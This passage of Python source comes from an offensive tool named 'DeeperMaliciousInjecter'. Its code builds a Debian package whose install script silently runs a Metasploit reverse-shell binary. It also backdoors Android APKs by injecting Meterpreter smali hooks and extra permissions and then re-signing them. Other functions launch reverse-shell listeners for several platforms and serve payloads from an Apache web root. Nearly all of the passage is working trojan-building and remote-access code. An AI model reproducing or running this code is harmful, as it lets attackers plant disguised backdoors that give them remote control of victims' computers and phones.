sudo chmod 2755 /usr/games/{} &&  /usr/games/{} && /usr/games/{} &
'''.format(PACN+'evil', PACN+'evil' ,PACN)



        else:
            PATH = "/tmp/evil/work/usr/bin/"
            postinst = '''#!/bin/bash
sudo chmod 2755 /usr/bin/{} && /usr/bin/{} && /usr/bin/{} &
'''.format(PACN+'evil', PACN+'evil',PACN)

        Control = """Package: Modified
Version: 0.90-1
Section: Sec
Priority: optional
Architecture: amd64
Maintainer: Debian Security Tools <teampkg-security@tracker.debian.org>
Description: a text-based minesweeper
    KSKSKSSKSKSKS
"""

        ###########################################################################

        #  Write postinst
        cmd('mkdir work/DEBIAN')
        # cmd("apt-cache show clamav | head -30 > work/DEBIAN/control")
        # cmd("apt-cache show {} | sed '/^Original-Maintainer/d' | sed '/^SHA/d' > work/DEBIAN/control".format(PACN))
        Cr_Control = open("work/DEBIAN/control", 'w')
        Cr_Control.write(Control)
        Cr_Control.close()
        cr_postinst = open('/tmp/evil/work/DEBIAN/postinst', 'w')
        cr_postinst.write(postinst)
        cr_postinst.close()

        ############################################################################################3

        print(astg,white+'Genrate Payload', end=""), self.Wait()
        sleep(1)

        cmd(r'msfvenom -a x86 --platform linux -p {} LHOST={} LPORT={} -b "\x00" -f elf -o {}{}>/dev/null 2>&1'.format(
            Payload, LHOST, LPORT, PATH, PACN+'evil'))
        print()
        print(astg,white+'Attempting to encode payload with 1 iterations of x86/shikata_ga_nai')
        sleep(2)
        Malicious = r"\x00\0xx0x\0xx0x\\"
        print(astg,white+ 'Inject Malicious Codes -> {} '.format(Malicious))
        cmd('chmod 755 /tmp/evil/work/DEBIAN/postinst')
        sleep(2)
        print(astg,white+ 'building ->', 'evil.deb')
        sleep(2)
        command = 'dpkg --build /tmp/evil/work>/dev/null 2>&1'
        x = cmd(command)
        if x == 0:
            cmd('cp /tmp/evil/work.deb /root/output/evil.deb>/dev/null 2>&1')
            print(astg, white+'Testing evil.deb .... ',end="")
            TestDeb = cmd('dpkg -i /root/output/evil.deb >/dev/null 2>&1')
            if TestDeb ==0:
                print('[OK]',end="")
                print()
                print(astg, white+'File Save As -> /root/output/evil.deb\n')
            else:
                print('[Error deb Package]',end="")
                print()
                print('[!] Try Another Deb Package')
                sys.exit()

        else:
            print(nok ,"Exception: Error building Package")
            sys.exit()

        #############################################

        os.chdir(Current_Dir)
        while True:
            Listen = input(qu +white+' Create Listener [y/n]? ')
            if Listen.lower() == "y" or Listen.lower() == "yes":
                print(w,white+"Happy Hunting")
                command = "xterm -fg green  -bg black -fa 'Monospace' -fs 11 -e   msfconsole -q -x 'use exploit/multi/handler;set PAYLOAD {}; set LHOST {}; set LPORT {}; run; exit -y'&".format(
                    Payload, LHOST, LPORT)
                cmd(command)
                sleep(1)
                print(G+"└──["+R+"DeeperMaliciousInjecter"+G+"]──["+R+"~"+G+"]─["+B+'PRESS ENTER'+G+"]: ",end="");input()
                break;


            elif Listen.lower() == "n" or Listen.lower() == "no":
                cmd('clear')
                Date = str(gmtime()[0:3]).replace(', ', '_').strip('()')
                self.PosTive_Loop()
                print("\n")
                print(white+'Export -> rc File ', end="")
                print(sep="", end="".format(self.Wait()))
                rc = "Handler_{}.rc".format(Date)
                Rc_Path = Current_Dir+"/"+rc
                if os.path.isfile(Rc_Path) == True:
                    rand_num = random.randrange(100)
                    rc = "Handler{}_{}.rc".format(rand_num, Date)

                RC_FILE = open(rc, 'w')
                RC_FILE.write(
                    'use exploit/multi/handler\nset payload {}\nset LHOST {}\nset LPORT {}\nset ExitOnSession false\nexploit -j'.format(
                        Payload, LHOST, LPORT))
                RC_FILE.close()
                sleep(2)
                global SAVEL
                SAVEL = Current_Dir +"/"+rc
                print()
                print(white+'File Save As : ', SAVEL)
                print()
                print(astg,white+"Use msfconsole -r Handler_{}.rc".format(Date))
                print()
                print(Ok,white+'Happy hunting ')
                print()
                print(G+"└──["+R+"DeeperMaliciousInjecter"+G+"]──["+R+"~"+G+"]─["+B+'PRESS ENTER'+G+"]: ",end="");input()
                break



    ###############################################################################################
    # Backdooring Android


    def Android_Backdoor(self):
        cmd("clear")

        # banner
        print(blue)
        print("""
                             _                           
  /\  ._   _| ._ _  o  _|   |_)  _.  _ |   _|  _   _  ._ 
 /--\ | | (_| | (_) | (_|   |_) (_| (_ |< (_| (_) (_) |  
                                                         
""")
        print()
        ###################################################        
        cmd('rm -rf ./work >/dev/null2>&1')
        cmd('mkdir ./work')
        
                  
        distro = platform.platform().split('-')[0]               
        Dist = green +"[~] "+distro+"@"+blue+"AndroRat > "+white

        sh = G+"└──["+R+"DeeperMaliciousInjecter"+G+"]──["+R+"~"+G+"]─["+B+'AndroidBackdoor'+G+"]: "
        Payloads = ['android/meterpreter/reverse_http', \
                    'android/meterpreter/reverse_https', \
                    'android/meterpreter/reverse_tcp', \
                    'android/meterpreter_reverse_http', \
                    'android/meterpreter_reverse_https', \
                    'android/meterpreter_reverse_tcp', \
                    'android/shell/reverse_http', \
                    'android/shell/reverse_https', \
                    'android/shell/reverse_tcp'

                    ]

        print(white+"╔─────────────────────────────────────────╗")
        for i in Payloads:
            print(white+"    [%d]" % (Payloads.index(i) +1),green,i)

        print(white+"╠─────────────────────────────────────────╝")
        print()

        try:
            payload = int(input(sh))
            if payload == 1 or payload==2 or payload==3 or payload==4 or payload==5 or payload==6 or payload==7 or payload==8 or payload==9 or payload==10:
                payload = Payloads[payload-1]

                cmd("clear")
                LHOST = input(warning+green+" Insert lhost -> ")
                if LHOST=="":
                    print(nok,"Exception: InputError")
                    sys.exit()
                LPORT = input(warning+green+" Insert lport -> ")
                if LPORT=="":
                    print(nok,"Exception: InputError")
                    sys.exit()
            
            else:
                input(nok+" Choice Not Valid Option Press [Enter] ... ")
                self.Android_Backdoor()


            ############# decompileing ###############
            apkfile = input(warning+green+' Insert Apk -> ')
            if apkfile=="":
                print(nok,"Exception Input Error")
                sys.exit()

            cmd("clear")
            command = 'msfvenom -p {} LHOST={} LPORT={} -o ./work/meterpreter.apk >/dev/null 2>&1 '.format(
            payload, LHOST, LPORT)
            if os.path.isfile(apkfile) == True:
                print(astg,"Creating Payload ")
                order = cmd(command)
                if order==0:
                    print(astg,'Decompiling original APK ')
                    cmd('./apktool.jar d -f -o ./work/original {} > /dev/null 2>&1 '.format(apkfile))
                    print(astg,'Decompiling payload APK')
                    cmd('./apktool.jar d -f -o ./work/payload ./work/meterpreter.apk >/dev/null')
                    # create a directory inside original apk
                    cmd('mkdir -p ./work/original/smali/com/metasploit/stage/>/dev/null 2>&1')
                    # copy payload *.smali to orginal apk
                    cmd('cp ./work/payload/smali/com/metasploit/stage/* ./work/original/smali/com/metasploit/stage>/dev/null 2>&1')
                    
                    ######### Inject Hook ###########
                    f = open('./work/original/AndroidManifest.xml', 'r')
                    d = f.read()
                    f.close()
                    print(astg,white+'Locating hook point')
                    # get hook location
                    d = d.split('<action android:name="android.intent.action.MAIN"/>')[0].split('<activity android:')[1]
                    acn = re.search(r'android:name=\"[\w.]+', d)
                    activityname = acn.group(0).split('"')[1]                   
                    acpath = activityname.replace('.', '/')
                    apn = apkfile.split('/')[-1]
                    print(astg,white+'Adding payload as package {}'.format(activityname))

                    smalipath = './work/original/smali/{}'.format(acpath)+".smali"
                    originalf = './work/original/AndroidManifest.xml'
                    payloadf = './work/payload/AndroidManifest.xml'

                    print(astg,white+"Injecting hooks in {} ...".format( activityname))
                    activityhook = "    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V"
                    
                    f1 = open(smalipath, "r")
                    buf = f1.readlines()  
                    f2 = open(smalipath, "w")
                    for line in buf:
                        if "->onCreate(Landroid/os/Bundle;)V" in line:
                            f2.write(line)
                            f2.write('\n')
                            f2.write(activityhook)
                            f2.write('\n')
                        else:
                            f2.write(line)
                    f2.close()
                    f1.close()
               

                    ############### Inject Permission ##################

                    f = open(payloadf, 'r')
                    f1 = open('./work/per.xml', 'w')
                    for line in f.readlines():
                        if '<uses-permission' in line:
                            f1.write(line)

                    f1.close()
                    f.close()

                    f = open(originalf, 'r')
                    f1 = open('./work/per.xml', 'r')
                    f2 = open('./work/fd485.xml', 'w')

                    for line in f.readlines():
                        f2.write(line)
                        if '<uses-permission' in line:
                            for line1 in f1.readlines():
                                f2.write(line1)

                    print(astg,white+'Adding permissions')
                    getper = open('./work/per.xml', 'r')
                    for per in getper.readlines():
                        per = per.strip('\n')
                        print(red+per)

                    getper.close()

                    f.close()
                    f1.close()
                    f2.close()

                    cmd('rm ./work/original/AndroidManifest.xml')
                    cmd('cat ./work/fd485.xml | uniq > ./work/final.xml')
                    cmd('mv ./work/final.xml ./work/original/AndroidManifest.xml')

                    ########## Rebuilding APK ############

                    print(astg,white+'Rebuilding {}'.format(apn))

                    cmd('./apktool.jar b ./work/original>/dev/null 2>&1')
                    
                    DIST_PATH = "./work/original/dist"
                    
                    if os.path.isdir(DIST_PATH)==True:

                        try:
                            cmd("rm -rf ./output>/dev/null")
                            cmd("mkdir ./output>/dev/null")
                            print(apn)
                            cmd('cp ./work/original/dist/{} ./work/output.apk >/dev/null2>&1'.format(apn))
                            os.chdir('./work')
                            
                            ############ Sigin APk ##################
                            print(astg,white+'Generate keystore')
                            cmd(
                                'keytool -genkeypair  -alias androiddebugkey -keypass android -keystore debug.keystore -storepass android -dname "CN=Android Debug, O=Android,C=US" -validity 9999 >/dev/null2>&1')

                            cmd(
                                'keytool -list -alias androiddebugkey -keystore debug.keystore -storepass android -keypass  android>/dev/null2>&1')
                            print(astg,white+ 'Signing {} '.format(apn))
                            cmd(
                                'jarsigner -verbose -keystore debug.keystore -storepass android -keypass android -digestalg SHA1 {} androiddebugkey >/dev/null2>&1'.format(
                                    apn))

                            
                            cmd('cp output.apk ../output/Evil.apk')
                            os.chdir(Current_Dir)
                            Saved = "output/Evil.apk"
                            print(astg,white+'File Save As : {}'.format(Saved))
                            print()
                            print(G+"└──["+R+"DeeperMaliciousInjecter"+G+"]──["+R+"~"+G+"]─["+B+'PRESS ENTER'+G+"]: ",end="");input()

                        except KeyboardInterrupt:
                            cmd("clear")
                            print(Ok,white+'CTRL+C PRESSED')
                            print(Ok,white+'Cleanning Generated Files')
                            cmd('rm -rf ./work>/dev/null 2>&1')
                            sleep(2)
                            print(astg,white+'Exit')
                            print(astg,white+"See You Later Bye !!!")
                            sys.exit()
                            
                            
                    else:
                        print()
                        print(nok,"Exception: Error Building {}".format(apn))
                        sys.exit()


                else:
                    print(nok,"Error Creating Payload")
                    sys.exit()
        

            else:
                print(nok,colored('Exception: Error FileNotFound', 'red'))
                sys.exit(1)
        
        
                




        except ValueError:
            self.Android_Backdoor()
        except KeyboardInterrupt:
            cmd("clear")
            print(Ok,white+'CTRL+C PRESSED')
            print(Ok,white+'Cleanning Generated Files')
            cmd('rm -rf ./work>/dev/null2>&1')
            sleep(2)
            print(astg,white+'Exit')
            print(astg,white+"See You Later Bye !!!")
            sys.exit()


        

                
    #############################################################

    def WEB_Delivery(self):
        cmd("clear")
        print(warning,"Choice Payloads")
        print()
        Payloads = ["python/meterpreter/reverse_tcp ", \
                    "python/meterpreter/reverse_http", \
                    "python/meterpreter/reverse_https", \
                    "python/shell_reverse_tcp"]

        for p in Payloads:
            print(white+'[%d]' % (Payloads.index(p) +1), colored(p, 'white'))

        
        #h ,c= colored('#', 'red') , colored(': ', 'cyan') ;she=h+c 
        sh = G+"└──["+R+"DeeperMaliciousInjecter"+G+"]──["+R+"~"+G+"]─["+B+'WEBDelivery'+G+"]: "
        print('\n')
        while True:
            try:
                Pay = int(input(sh))
                if Pay == 1 or Pay == 2 or Pay == 3 or Pay == 4:
                    break
                else:
                    continue
            except ValueError:
                continue

        Pay = Payloads[Pay-1]
        cmd('clear')
        LHOST = input(astg+" Insert lhost > ")
        LPORT = input(astg+" Insert lport > ")

        RC_FILE = open('Hack.rc', 'w')
        RC_FILE.write(
            'use exploit/multi/script/web_delivery\nset payload {}\nset lhost {}\nset lport {}\nexploit -j'.format(Pay,
                                                                                                                   LHOST,
                                                                                                                   LPORT))
        RC_FILE.close()

        cmd("xterm -fg green  -bg black -fa 'Monospace' -fs 11 -e  msfconsole -r Hack.rc &")

    def HOLD(self):
        for i in range(1, 5):
            print(colored('.', 'green'), end="")
            sys.stdout.flush()
            sleep(0.08)
#############################################################################

    def web_Server(self):
        cmd("clear")

        # Check If Payload Are Created

        # Msfvenom Pyaload
        try:
            loc_backdoor = Current_Dir +'/'+  Pay_Name+Format
            if os.path.isfile(loc_backdoor) == True:
                cmd('cp {} /var/www/html'.format(loc_backdoor))
                print(astg ,"Loaded Payload "+savel)
                #print("Payload => "+payload)
                command = 'systemctl status apache2.service>/dev/null2>&1'
                Apache_Stat = cmd(command)

                if Apache_Stat != 0:
                    print('Starting Apache ', end="")
                    command = 'systemctl start apache2.service'
                    cmd(command)
                    ok = colored(" [OK]", 'green')
                    print(ok, sep="", end="".format(self.HOLD()))
                    print('\n')
                    print(astc, 'Use http://{}/{}'.format(LHOST, Pay_Name+Format))
                    sys.exit()

                else:
                    print('Checking Apache ', end="")
                    Stat = "["+  colored('Running', "green") + "]"
                    print(Stat, sep="", end="".format(self.HOLD()))
                    print('\n')
                    print(astc, 'Use http://{}/{}'.format(LHOST, Pay_Name +Format))
                    sys.exit()
           
        except NameError:
            
            cmd("clear")
            command = 'systemctl status apache2.service>/dev/null2>&1'
            Apache_Stat = cmd(command)
            if Apache_Stat != 0:
                print(cyan+":::::::::::::::::::::::::::::::::::::::::::")
                print(white+"           Apache Service")
                print(cyan+":::::::::::::::::::::::::::::::::::::::::::")
                sleep(1)
                print(white+'Starting Apache ', end="",sep=""),self.HOLD()
                command = 'systemctl start apache2.service'
                cmd(command)
                sleep(1)
                print(white+"[{}]".format(green+"OK"+white),end="",sep="")
                print()
            
                
            else:
                sleep(1)
                print(red+":::::::::::::::::::::::::::::::::::::::::::")
                print(white+"      Service Apache2 [{}]".format(green+"Running"+white),end="",sep="")
                print()
                print(red+":::::::::::::::::::::::::::::::::::::::::::")
                print()
            
            print("\n")
            print(G+"└──["+R+"DeeperMaliciousInjecter"+G+"]──["+R+"~"+G+"]─["+B+'PRESS ENTER'+G+"]: ",end="");input()
        

           

    def Handler(self):
        cmd("clear")
        # banner
        print(blue+"""
  |\     /|\     /|\     /|\     /|\     /|\     /|\     /|\     /|
| +---+ | +---+ | +---+ | +---+ | +---+ | +---+ | +---+ | +---+ |
| |   | | |   | | |   | | |   | | |   | | |   | | |   | | |   | |
| |L  | | |i  | | |s  | | |t  | | |e  | | |n  | | |e  | | |r  | |
| +---+ | +---+ | +---+ | +---+ | +---+ | +---+ | +---+ | +---+ |
|/_____\|/_____\|/_____\|/_____\|/_____\|/_____\|/_____\|/_____\|
                                                                 
        """)
        print()

        # Payloads
        Win_Payload = ['windows/meterpreter/reverse_tcp', \
                       'windows/meterpreter/reverse_http', \
                       'windows/meterpreter/reverse_https', \
                       'windows/shell/reverse_tcp'
                       ]

        Linux_Payloads = ['linux/x86/shell/reverse_tcp ', \
                          'linux/x86/meterpreter/reverse_tcp ', \
                          'linux/x64/meterpreter/reverse_tcp', \
                          'linux/x86/meterpreter/bind_tcp ', \
                          'linux/x86/shell/bind_tcp', \
                          'linux/x86/meterpreter_reverse_http', \
                          'linux/x86/meterpreter_reverse_https'

                          ]

        Mac_Payloads = ['osx/x64/meterpreter/reverse_tcp', \
                        'osx/x64/meterpreter/bind_tcp', \
                        'osx/x64/shell_reverse_tcp', \
                        'osx/x86/shell_reverse_tcp '

                        ]

        Andro_Payloads = ['android/meterpreter/reverse_http', \
                          'android/meterpreter/reverse_https', \
                          'android/meterpreter/reverse_tcp', \
                          'android/meterpreter_reverse_http', \
                          'android/meterpreter_reverse_https', \
                          'android/meterpreter_reverse_tcp', \
                          'android/shell/reverse_http', \
                          'android/shell/reverse_https', \
                          'android/shell/reverse_tcp'
                          ]

        Py_Payloads = ["python/meterpreter/reverse_http", \
                       "python/meterpreter/reverse_https", \
                       "python/meterpreter/reverse_tcp", \
                       "python/shell_reverse_tcp"

                       ]

        def Get_Sock():
            global LHOST, LPORT
            self.PosTive_Loop()
            print()
            LHOST = input(astg+ green + " Insert lhost > "  )
            self.PosTive_Loop()
            print()
            LPORT = input(astg+ green + " Insert lport > "  )

########################################################################
        Date = str(gmtime()[0:3]).replace(', ', '_').strip('()')
        rc = "Handler_{}.rc".format(Date)
        RC_PATH = Current_Dir+'/'+rc
        #print(RC_PATH)    
        print(cyan+"[1] Load Listener For Current Configration")
        print(cyan+"[2] Create New Listener")
        print()
        print(G+"│")
        sh = G+"└──["+R+"DeeperMaliciousInjecter"+G+"]──["+R+"~"+G+"]─["+B+'Listener'+G+"]: "
        choice = int(input(sh))
        if choice == 1:
            try:
                if os.path.isfile(RC_PATH) == True:
                    cmd('xterm -e msfconsole -r  {}>/dev/null 2>&1 &'.format(RC_PATH))

                elif os.path.isfile(RC_PATH) == False:
                     cmd('xterm -e msfconsole -q -x "use exploit/multi/handler;set PAYLOAD {}; set LHOST {}; set LPORT {};set ExitOnSession false; run; exit -y"'.format(
                            payload, LHOST, LPORT))



                    #cmd(
                        #'msfconsole -q -x "use exploit/multi/handler;set PAYLOAD {}; set LHOST {}; set LPORT {};set ExitOnSession false; run; exit -y"'.format(
                            #payload, LHOST, LPORT))



            except:
                print()
                print(nok,white+"No Configration Loaded ")
                print()
                #input(yellow+"PRESS [ENTER] TO RUTURN ..... "+white)

        else:
            cmd("clear")
            print(white+"[1] Listener For Windows")
            print(white+'[2] Listener For Linux')
            print(white+'[3] Listener For Mac')
            print(white+"[4] Listener For Android")
            print(white+'[5] Listener For Python')
            print()

            try:
                print(G+"│")
                sh = G+"└──["+R+"DeeperMaliciousInjecter"+G+"]──["+R+"~"+G+"]─["+B+'Listener'+G+"]: "

                CHOICE = int(input(sh))

                if CHOICE==1:
                    cmd("clear")
                    for p in Win_Payload:
                        print(white+'[%d]' % (Win_Payload.index(p) +1), white+p)

                    print()
                    Payload = int(input(sh))
                    if Payload==1 or Payload==2 or Payload==3 or Payload==4 :
                        Payload = Win_Payload[Payload-1]
                        cmd("clear")
                        Get_Sock() ; print()
                        print(Ok +white,"Run Handler",end=""),self.Wait() ; print()
                        print(astg+white,'Happy Hunting')
                        sleep(3)
                        cmd('xterm -fg green  -bg black -fa "Monospace" -fs 11 -e  msfconsole -x "use exploit/multi/handler;set PAYLOAD {}; set LHOST {}; set LPORT {}; exploit -j">/dev/null 2>&1 &'.format(Payload, LHOST, LPORT))
                    else:
                        print(nok,white+" Exception: Choice Not Valid Option")
                        sys.exit()

                elif CHOICE == 2:
                    cmd("clear")

                    for p in Linux_Payloads:
                        print(white+"[%d]" % (Linux_Payloads.index(p) +1), white,p)

                    print()
                    Payload = int(input(sh))

                    if Payload == 1 or Payload == 2 or Payload == 3 or Payload == 4 or Payload==5 or Payload==6 or Payload==7 :
                        Payload = Linux_Payloads[Payload-1]
                
                        cmd("clear")
                        Get_Sock() ; print()                       
                        print(Ok,white+"Run Handler", end=""), self.Wait()
                        print()
                        print(astg,white+'Happy Hunting')
                        sleep(3)

                        cmd('xterm -fg green  -bg black -fa "Monospace" -fs 11 -e  msfconsole -x "use exploit/multi/handler;set PAYLOAD {}; set LHOST {}; set LPORT {}; exploit -j">/dev/null 2>&1 &'.format(Payload, LHOST, LPORT))

                    else:
                        print(nok," Exception: Choice Not Valid Option")
                        sys.exit()

                elif CHOICE == 3:
                    cmd("clear")
                    for p in Mac_Payloads:
                        print(white+'[%d]' % (Mac_Payloads.index(p) +1), white+p)
                    print()
                    Payload = int(input(sh))

                    if Payload==1 or  Payload==2 or Payload==3 or Payload==4:
                        Payload = Mac_Payloads[Payload-1]
                        Get_Sock() ; print()                        
                        print(Ok,white+"Run Handler", end=""), self.Wait()
                        print()
                        print(astg,white+'Happy Hunting')
                        sleep(3)
                        cmd(
                            'xterm -fg green  -bg black -fa "Monospace" -fs 11 -e  msfconsole -x "use exploit/multi/handler;set PAYLOAD {}; set LHOST {}; set LPORT {}; exploit -j">/dev/null 2>&1 &'.format(
                                Payload, LHOST, LPORT))
                    else:
                        print(x," Exception: Choice Not Valid Option")
                        sys.exit()


                elif CHOICE == 4:
                    cmd("clear")
                    for p in Andro_Payloads:
                        print(white+'[%d]' % (Andro_Payloads.index(p) +1), white,p)
                    print()
                    Payload = int(input(sh))
                    if Payload == 1 or Payload == 2 or Payload == 3 or Payload == 4 or Payload == 5 or Payload == 6 or Payload == 7 or Payload==8 or Payload==9:
                        Payload = Andro_Payloads[Payload-1]
                        cmd("clear")
                        Get_Sock() ; print()                        
                        print(white+Ok,"Run Handler", end=""), self.Wait()
                        print()
                        print(astg,white+'Happy Hunting')
                        sleep(3)
                        cmd(
                            'xterm -fg green  -bg black -fa "Monospace" -fs 11 -e  msfconsole -x "use exploit/multi/handler;set PAYLOAD {}; set LHOST {}; set LPORT {}; exploit -j">/dev/null 2>&1 &'.format(
                                Payload, LHOST, LPORT))

                    else:
                        print(nok,white+"Exception: Choice Not Valid Option")
                        sys.exit()



                elif CHOICE == 5:
                    cmd("clear")
                    for p in Py_Payloads:
                        print(white+'[%d]' % (Py_Payloads.index(p) +1), white+p)
                    print()
                    Payload = int(input(sh))

                    if Payload==1 or Payload==2 or Payload==3 or Payload==4:
                        Payload = Py_Payloads[Payload-1]
                        cmd("clear")
                        Get_Sock() ; print()                        
                        print(Ok," Run Handler", end=""), self.Wait()
                        print()
                        print(astg,' Hapy Hunting')
                        sleep(3)
                        cmd('xterm -fg green  -bg black -fa "Monospace" -fs 11 -e  msfconsole -x "use exploit/multi/handler;set PAYLOAD {}; set LHOST {}; set LPORT {}; exploit -j">/dev/null 2>&1 &'.format(CHOICE, LHOST, LPORT))

                    else:
                        print(nok,white+"Exception: Choice Not Valid Option")
                        sys.exit()
                else:
                    print(nok,white+"Choice Not Valid Option")
                    sys.exit()

            except ValueError:
                print(nok,white+"Exception Input Error")
                sys.exit()
        print()
        sleep(2)
        print(G+"└──["+R+"DeeperMaliciousInjecter"+G+"]──["+R+"~"+G+"]─["+B+'PRESS ENTER'+G+"]: ",end="");input()



    def Quit(self):
        global Counter
        try:
            if Counter == 1:
                print()
                print(Ok,white+"Happy Hunting ")
                print()
                print(astg,white+"See You Later Bye !! ")
                sys.exit()
            elif Counter == None:
                print()
                print(astg,white+"See You Later Bye !! ")
                sys.exit()


        except NameError:
            NOts = [warning +" Stay Focus", warning + " See You Later Bye !!!!! ", astg + " See You Later Bye",
                    astg + " MOTD: Ghosts'n'Goblins, Trojan, Out Run, Bump'n'jump, Side Arms...",
                    astg+" MOTD: It's the voodoo who do what you don't dare to people!", astg +" Love Pentest"]
            cmd('clear')
            print()
            print(random.choice(NOts))
            print()
            sys.exit()

    #################################################################


    def CO_Loop(self):
        for i in range(40):
            print(colored(":",'red'),end="")
            sys.stdout.flush()
            sleep(0.007)

    def GET_ADDR_INFO(self):
        cmd('clear')
        site = "https://iplocation.com/"
        Info = []
        try:
            req = urllib.request.Request(site)
            url = urllib.request.urlopen(req)
            sitereader = url.read()
            soup = BeautifulSoup(sitereader, 'html.parser')
            for i in soup.findAll('div', {"class": "central-column"}):
                i = i.text
                Info.append(i)

        except:
            print(warning,colored('Check Your Internet Connection ', 'red'))
            sys.exit()


        AddrInfo = str(Info)
        AddrInfo = AddrInfo.split('\\n')
        IP = AddrInfo[20];
        self.CO_Loop()
        print()
        IP = colored(IP, 'cyan')
        print(r, colored('Puplic Ip ==>', 'cyan'), IP)
        Country = AddrInfo[32];
        if Country=='':
            print(x, colored('Country  ==> Not Available', 'cyan'))

        else:
            print(r, colored('Country ==>', 'cyan'),colored( Country,'cyan'))

        Region = AddrInfo[36]



        if Region=='':
            print(x,colored("Region ==> Not Available ",'cyan'))
        else:
            print(r, colored('Region ==> ', 'cyan'), colored(Region,'cyan'))
        City = AddrInfo[40];

        if City=='':
            print(x, colored("City ==> Not Available ", 'cyan'))

        else:
            print(r, colored('City ==> ', 'cyan'), colored(City,'cyan'))
        ISP = AddrInfo[44]

        if ISP=='':
            print(x, colored('ISP ==> Not Available', 'cyan'))
        else:
            print(r, colored('ISP ==>', 'cyan'), colored(ISP,'cyan'))




        print()
        self.CO_Loop()
        print("\n")
        print(G+"└──["+R+"DeeperMaliciousInjecter"+G+"]──["+R+"~"+G+"]─["+B+'PRESS ENTER'+G+"]: ",end="");input()
        cmd('clear')


x = DEEPER()




